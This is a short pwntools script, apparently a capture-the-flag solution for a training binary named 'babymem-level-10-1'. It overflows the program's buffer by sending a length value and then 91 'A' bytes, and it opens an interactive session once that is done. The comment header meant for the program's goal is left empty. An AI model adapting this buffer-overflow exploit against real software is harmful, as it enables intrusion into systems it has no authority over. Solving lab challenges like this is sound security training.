#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --

-----------------------------
'''

context.log_level = 'CRITICAL'

elf = ELF('/challenge/babymem-level-10-1')
p = elf.process()

delta_len = 91
bytestream = b'A' * delta_len

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
